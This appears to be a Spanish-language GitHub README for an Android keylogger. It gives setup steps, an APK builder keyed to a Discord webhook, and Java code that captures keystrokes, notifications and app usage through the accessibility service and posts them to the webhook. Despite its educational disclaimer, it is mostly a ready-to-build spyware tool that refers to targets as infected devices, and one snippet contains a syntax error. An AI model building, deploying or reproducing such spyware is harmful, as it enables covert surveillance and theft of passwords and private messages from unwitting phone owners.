# Keylogger para Monitoreo en Android con Integración en Discord

## 📌 Descripción
Este proyecto es un **keylogger** para dispositivos Android que permite el monitoreo de pulsaciones de teclas, notificaciones y tiempo de uso de aplicaciones. Los datos recopilados se envían a un servidor de Discord a través de un webhook. Este proyecto tiene **fines académicos** y está diseñado para demostrar la importancia de la privacidad y seguridad en los dispositivos móviles.

## 🚀 Características
- Obtención de información del sistema infectado.
- Monitoreo de pulsaciones de teclas.
- Monitoreo de notificaciones recibidas.
- Registro del tiempo de uso de aplicaciones.
- Envío de datos a un servidor de Discord mediante un webhook.
- Instalador automatizado para la generación de la APK con configuración personalizada.

## ⚙️ Instalación
### Requisitos
- **Android Studio** con soporte para Gradle.
- **Python 3** instalado.
- Biblioteca `ttkbootstrap` para la interfaz gráfica del instalador:
  ```sh
  pip install ttkbootstrap
  ```

### Pasos de instalación
1. **Clonar el repositorio**
   ```sh
   git clone https://github.com/SolarSpectre/Android-Keylogger-Discord.git
   cd Android-Keylogger-Discord
   ```
2. **Ejecutar el instalador**
   ```sh
   python installer.py
   ```
3. **Ingresar la URL del webhook de Discord** y generar la APK.

![image](https://github.com/user-attachments/assets/42e74f16-1d10-4a2a-bac4-5bf57308af90)

4. **Instalar la APK en el dispositivo Android**.
5. **Activar los permisos de accesibilidad** para permitir el monitoreo.

## 🛠️ Funcionamiento
### 1️⃣ Obtener información del sistema
El keylogger recopila detalles sobre el dispositivo infectado, como fabricante, modelo, versión de Android y número de compilación.
```java
private String getSYSInfo() {
    return "MANUFACTURER : " + Build.MANUFACTURER + "\n" +
           "MODEL : " + Build.MODEL + "\n" +
           "PRODUCT : " + Build.PRODUCT + "\n" +
           "VERSION.RELEASE : " + Build.VERSION.RELEASE + "\n" +
           "VERSION.SDK.NUMBER : " + Build.VERSION.SDK_INT + "\n";
}
```

### 2️⃣ Monitoreo de pulsaciones de teclas
Utiliza el servicio de accesibilidad para capturar texto ingresado por el usuario.
```java
private void handleTextChangedEvent(AccessibilityEvent event) {
    List<CharSequence> textList = event.getText();
    for (CharSequence text : textList) {
        currentKeyEvents.append(text.toString()).append("\n");
    }
    sendBufferToDiscordAndClear();
}
```

### 3️⃣ Monitoreo de notificaciones
Registra las notificaciones recibidas en el dispositivo.
```java
private void handleNotificationChangedEvent(AccessibilityEvent event) {
    for (CharSequence text : event.getText()) {
        currentKeyEvents.append("Notification: ").append(text).append("\n");
    }
    sendBufferToDiscordAndClear();
}
```

### 4️⃣ Monitoreo del tiempo de uso de aplicaciones
Registra la duración de uso de cada aplicación abierta.
```java
private void handleAppFocusChange(AccessibilityEvent event, String time) {
    String packageName = event.getPackageName().toString();
    long timeSpent = System.currentTimeMillis() - lastFocusedTime;
    currentKeyEvents.append("App: " + packageName + " | Duration: " + (timeSpent / 1000) + "s\n");
    sendBufferToDiscordAndClear();
}
```

### 5️⃣ Envío de registros a Discord
Los datos recopilados se envían a un webhook configurado en Discord.
```java
public static void sendMessage(String logMessage) {
    JSONObject messageJSON = new JSONObject();
    messageJSON.put("content", "```\n" + logMessage + "\n```);

    URL url = new URL(WEBHOOK_URL);
    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
    connection.setRequestMethod("POST");
    connection.setRequestProperty("Content-Type", "application/json");
    connection.setDoOutput(true);
}
```

![image](https://github.com/user-attachments/assets/a108cf79-0845-428b-9a37-78f85e41eb6e)

> [!IMPORTANT]
> Este proyecto es únicamente **para fines educativos y de concienciación sobre seguridad informática**
> 
> **No debe usarse para actividades ilegales o malintencionadas**.
> 

## ✉️ Contacto
Autor: **Joseph Caza**  
[LinkedIn](https://www.linkedin.com/in/josephcaza/)  
GitHub: [SolarSpectre](https://github.com/SolarSpectre)
